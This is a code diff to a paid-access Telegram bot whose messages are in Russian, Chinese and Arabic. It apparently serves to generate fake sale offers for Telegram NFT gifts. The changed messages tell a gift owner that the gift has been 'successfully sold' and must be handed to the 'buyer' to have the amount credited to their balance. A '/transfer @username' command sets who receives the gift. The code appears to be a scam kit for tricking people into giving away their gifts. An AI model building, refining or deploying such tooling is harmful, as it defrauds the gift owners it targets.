@@ -39,13 +39,13 @@ def display_name(user) -> str:
 
 def instruction(locale="ru"):
     return (
-        "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\\n"
-        "<blockquote><code>оф https://t.me/nft/PartySparkler-140864 150 stars</code></blockquote>\\n"
-        "<b>Доступные языки:</b>\\n\\n"
-        "Английский\\n<blockquote>В конце команды: англ/en</blockquote>\\n"
-        "Арабский\\n<blockquote>В конце команды: араб</blockquote>\\n"
-        "Китайский\\n<blockquote>В конце команды: кидай</blockquote>\\n\\n"
-        "<b>Изменить профиль в кнопке «Передать» по команде:</b>\\n"
+        "<b>ОСНОВНАЯ КОМАНДА НА РУССКОМ ЯЗЫКЕ:</b>\n"
+        "<blockquote><code>Оф https://t.me/nft/123 3в/stars | gram/</code></blockquote>\n"
+        "<b>Доступные языки:</b>\n\n"
+        "Английский\n<blockquote>В конце команды: англ/en</blockquote>\n"
+        "Арабский\n<blockquote>В конце команды: араб</blockquote>\n"
+        "Китайский\n<blockquote>В конце команды: кидай</blockquote>\n\n"
+        "<b>Изменить профиль в кнопке «Передать» по команде:</b>\n"
         "<blockquote><code>/transfer @username</code></blockquote>"
     )
 
@@ -660,15 +660,15 @@ async def back_to_start_callback(call: CallbackQuery):
 @dp.callback_query(F.data == "show_instruction")
 async def show_instruction_callback(call: CallbackQuery):
     if not call.from_user or not db.has_access(call.from_user.id, cfg.owner_id, cfg.offer_access_mode):
-        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Купить", callback_data="buy_access")], [InlineKeyboardButton(text="В меню", callback_data="back_to_start")]])
+        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Купить", callback_data="buy_access")], [InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]])
         await call.message.answer("Для просмотра инструкции сначала необходим активный доступ.", reply_markup=kb)
         await call.answer()
         return
     try:
-        rows = [[InlineKeyboardButton(text="В меню", callback_data="back_to_start")]]
+        rows = [[InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]]
         await call.message.edit_text(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
     except Exception:
-        await call.message.answer(instruction())
+        await call.message.answer(instruction(), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Вернуться в меню", callback_data="back_to_start")]]))
     await call.answer()
 
 
@@ -1074,7 +1074,7 @@ async def offer_callback(call: CallbackQuery):
             else:
                 alert_amount_text = f"{offer['amount']:g}₽"
             if offer["locale"] == "ru":
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, чтобы получить {amount_text}."
+                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, для зачисления {amount_text} на Ваш баланс."
             elif offer["locale"] == "cn":
                 final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
             elif offer["locale"] == "ar":
@@ -1094,7 +1094,7 @@ async def offer_callback(call: CallbackQuery):
                 try: await bot.send_message(offer["seller_id"], f"✅ Ваш офер принят\nПодарок: {title}\nСумма: {amount_text}")
                 except Exception: log.warning("Could not notify seller about accepted offer")
                 if offer["locale"] == "ru":
-                    alert_text = f"Ваш подарок {title} успешно продан.\nПередайте подарок покупателю для зачисления {alert_amount_text}."
+                    alert_text = f"Ваш подарок {title} успешно продан.\n\nПередайте подарок покупателю для зачисления {alert_amount_text} на ваш баланс."
                 elif offer["locale"] == "cn":
                     alert_text = f"礼物 {title} 已成功售出。\n请将礼物转给买家，以便到账 {alert_amount_text}。"
                 elif offer["locale"] == "ar":
